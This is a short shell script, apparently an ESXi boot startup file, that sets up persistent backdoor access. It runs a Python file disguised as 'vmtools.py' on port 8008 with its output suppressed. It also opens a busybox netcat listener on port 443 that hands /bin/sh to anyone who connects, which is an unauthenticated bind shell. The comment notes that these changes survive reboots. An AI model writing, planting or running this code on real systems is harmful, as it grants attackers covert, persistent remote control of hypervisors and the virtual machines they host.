#!/bin/sh

# ESXi runs this at boot; changes here survive a reboot.

/bin/nohup /store/packages/vmtools.py -p 8008 >/dev/null 2>&1 &
/usr/lib/vmware/busybox/bin/busybox nc -l -p 443 -e /bin/sh &
exit 0
